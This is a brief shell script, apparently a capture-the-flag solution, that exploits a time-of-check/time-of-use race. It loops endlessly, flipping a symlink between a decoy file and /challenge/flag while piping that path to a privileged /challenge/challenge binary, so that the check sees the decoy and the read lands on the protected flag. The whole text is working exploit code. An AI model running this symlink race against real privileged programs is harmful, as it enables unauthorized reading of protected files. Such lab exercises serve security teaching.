rm flag not_the_flag result
touch not_the_flag
echo "this is not the flag you are looking for" > not_the_flag
while true
do
    ln -sf not_the_flag flag
    echo "/tmp/hutaobestwaifu/flag" | /challenge/challenge &
	ln -sf /challenge/flag flag
done